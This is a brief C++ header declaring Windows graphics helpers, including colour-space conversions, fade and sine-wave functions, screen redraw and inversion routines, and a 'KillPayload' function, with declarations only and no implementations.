#pragma once

#include "main.h";

double fade(double maxIntensity);
COLORREF COLORRGB(int length, int speed);
COLORREF COLORHSL(int length);
void RGBtoHSV(COLORREF rgb, double& h, double& s, double& v);
COLORREF HSVtoRGB(double h, double s, double v);
VOID WINAPI KillPayload(HANDLE h);
VOID WINAPI RedrawScreen(HWND hwnd);
VOID WINAPI InvertColor(DWORD& color);
VOID WINAPI delay(unsigned int milliseconds);
double SineWave(double amplitude, double frequency, double time, double sampleRate);